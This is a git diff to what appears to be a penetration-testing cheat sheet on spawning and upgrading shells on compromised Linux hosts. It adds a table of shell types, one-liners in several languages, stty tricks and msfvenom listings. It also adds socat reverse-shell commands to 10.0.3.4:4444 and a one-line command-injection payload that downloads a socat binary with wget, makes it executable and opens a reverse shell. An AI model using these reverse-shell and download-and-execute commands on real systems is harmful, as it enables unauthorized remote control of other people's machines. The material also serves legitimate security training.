@@ -11,6 +11,7 @@ tags:
 
 # Spawn a shell
 
+
 Webshell is a script written in a language that is executed by a server. Web shell are not fully interactive. 
 
 ??? note "Resources for upgrading simple shells"
@@ -22,10 +23,25 @@ Webshell is a script written in a language that is executed by a server. Web she
 
 Sidenote: Also, you can generate a webshell by using  msfvenom
 
-## 
+## Clasification of shells
+
+On a Linux system, the shell is a program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function.
+
+There are three main types of shell connections:
+
+| **Shell Type** |  **Description** | 
+| ----------- | -------------- |
+| Reverse shell |  Initiates a connection back to a "listener" on our attack box. | 
+| Bind shell | "Binds" to a specific port on the target host and waits for a connection from our attack box. | 
+| Web shell | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command. |
+
+
+## Spawn a shell
+
+### bash
 
 ```bash
-#Upgrafe shell with running these commands all at once:
+# Upgrafe shell with running these commands all at once:
 
 SHELL=/bin/bash script -q /dev/null
 Ctrl-Z
@@ -36,7 +52,7 @@ xterm
 ```
 
 
-## python
+### python
 
 ```bash
 python -c 'import os; os.system("/bin/sh")'
@@ -48,7 +64,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 
-## bash
+### bash
 
 ```bash
 bash -i
@@ -58,14 +74,14 @@ echo 'os.system('/bin/bash')'
 ```
 
 
-## ssh
+### ssh
 
 ```bash
 /bin/sh -i
 ```
 
 
-## perl
+### perl
 
 ```bash
 perl -e 'exec "/bin/sh";'
@@ -74,32 +90,47 @@ perl:  exec "/bin/sh";
 ```
 
 
-## ruby
+### ruby
 
 ```bash
 ruby:  exec "/bin/sh";
 ```
 
 
-## lua
+### lua
 
 ```bash
 lua: os.execute(‘/bin/sh’)
 ```
   
 
-## socat
+### socat
 
 ```bash
 # Listener:
-socat file:`tty`,raw,echo=0 tcp-listen:4444whi
+socat file:`tty`,raw,echo=0 tcp-listen:4444
 
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-  
 
-## stty options
+If socat isn’t installed, there exists other options. There are standalone binaries that can be downloaded from this Github repo: [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
+
+With a command injection vuln, it’s possible to download the correct architecture `socat` binary to a writable directoy, chmod it, then execute a reverse shell in one line:
+
+```bash
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
+
+On Kali, run:
+
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
+and you’ll catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc. It’s a full terminal. 
+
+### stty options
 
 ```bash
 # In reverse shell
@@ -119,4 +150,19 @@ $ reset
 $ export SHELL=bash
 $ export TERM=xterm-256color
 $ stty rows <num> columns <cols>
+```
+
+### msfvenom
+
+You can generate a webshell by using  msfvenom
+
+```bash
+# List payloads
+msfvenom --list payloads | grep x64 | grep linux | grep reverse  
+```
+
+Also msfvenom can use metasploit payloads under “cmd/unix”  to generate one-liner bind or reverse shells. List options with:
+
+```bash
+msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
 ```
